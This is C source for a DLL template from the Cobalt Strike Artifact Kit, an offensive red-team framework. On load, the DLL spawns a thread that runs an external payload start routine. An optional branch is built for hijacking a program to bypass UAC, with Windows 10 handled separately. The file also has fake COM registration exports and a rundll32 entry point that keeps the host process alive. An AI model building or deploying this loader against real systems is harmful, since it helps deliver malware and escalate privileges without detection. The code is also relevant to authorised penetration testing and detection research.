/*
 * Cobalt Strike Artifact Kit
 *
 * (c) 2013 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * This is a plain jane DLL
 */
#include "windows.h"

void start(HINSTANCE handle);

HINSTANCE myhandle;

DWORD ThreadProc(LPVOID param) {
	start(myhandle);
#ifdef _BYPASSUAC_
	exit(0);
#endif
	return 0;
}

#ifdef _BYPASSUAC_
BOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
	OSVERSIONINFO osvi;

	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			/* store our DLL's handle, in case it's needed later */
			myhandle = hDll;

			/* unfortunately, we have to treat Windows 10 slightly different from other OSs due to the
			   program we're hijacking. */
			ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
			osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
			GetVersionExA(&osvi);

			/* Windows 10 (wait for our thread to complete) */
			if (osvi.dwMajorVersion >= 10) {
				ThreadProc(NULL);
			}
			/* Everything else? Just spawn a thread and let it do its thing */
			else {
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadProc, (LPVOID)NULL, 0, NULL);
			}
		break;
	}
	return TRUE;
}
#else
BOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			/* create a thread here... if a start function blocks--it could hold up other
			   DLLs loading and then nothing will appear to work */
			myhandle = hDll;
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadProc, (LPVOID)NULL, 0, NULL);
		break;
	}
	return TRUE;
}
#endif


STDAPI DllRegisterServer(void) {
	return (HRESULT)S_OK;
}

STDAPI DllUnregisterServer(void) {
	return (HRESULT)S_OK;
}

STDAPI DllGetClassObject( REFCLSID rclsid, REFIID riid, LPVOID *ppv ) {
	return CLASS_E_CLASSNOTAVAILABLE;
}

STDAPI DllRegisterServerEx( LPCTSTR lpszModuleName ) {
	return (HRESULT)S_OK;
}

/* rundll32.exe entry point Start */
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
	while (TRUE)
		Sleep(60 * 1000);
}
